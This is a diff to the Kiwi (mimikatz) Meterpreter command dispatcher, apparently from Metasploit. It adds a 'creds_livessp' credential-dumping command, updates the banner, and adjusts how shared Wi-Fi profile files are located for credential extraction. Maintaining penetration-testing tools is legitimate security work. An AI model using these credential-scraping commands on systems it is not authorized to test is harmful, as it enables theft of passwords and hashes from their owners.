@@ -37,8 +37,8 @@ class Console::CommandDispatcher::Kiwi
   def initialize(shell)
     super
     print_line
-    print_line("  .#####.   mimikatz 2.1.1 20180925 (#{client.session_type})")
-    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
+    print_line("  .#####.   mimikatz 2.2.0 20191125 (#{client.session_type})")
+    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)")
     print_line(" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
     print_line(" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")
     print_line(" '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )")
@@ -49,10 +49,6 @@ class Console::CommandDispatcher::Kiwi
     if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
       print_warning('Loaded x86 Kiwi on an x64 architecture.')
       print_line
-    end
-
-    if si['OS'] =~ /Windows (NT|XP|2000|2003|\.NET)/i
-      print_warning("Loaded Kiwi on an old OS (#{si['OS']}). Did you mean to 'load mimikatz' instead?")
     end
   end
 
@@ -67,6 +63,7 @@ class Console::CommandDispatcher::Kiwi
       'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
       'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
       'creds_ssp'             => 'Retrieve SSP creds',
+      'creds_livessp'         => 'Retrieve Live SSP creds',
       'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
       'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
       'creds_all'             => 'Retrieve all credentials (parsed)',
@@ -402,8 +399,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all the shared wifi profiles/credentials
   #
   def cmd_wifi_list_shared(*args)
-    interfaces_dir = '%AllUsersProfile%\Microsoft\Wlansvc\Profiles\Interfaces'
-    interfaces_dir = client.fs.file.expand_path(interfaces_dir)
+    interfaces_dir = client.sys.config.getenv('AllUsersProfile') + '\Microsoft\Wlansvc\Profiles\Interfaces'
     files = client.fs.file.search(interfaces_dir, '*.xml', true)
 
     if files.length == 0
@@ -490,6 +486,14 @@ class Console::CommandDispatcher::Kiwi
   def cmd_creds_ssp(*args)
     method = Proc.new { client.kiwi.creds_ssp }
     scrape_passwords('ssp', method, args)
+  end
+
+  #
+  # Dump all LiveSSP credentials to screen.
+  #
+  def cmd_creds_livessp(*args)
+    method = Proc.new { client.kiwi.creds_livessp }
+    scrape_passwords('livessp', method, args)
   end
 
   #
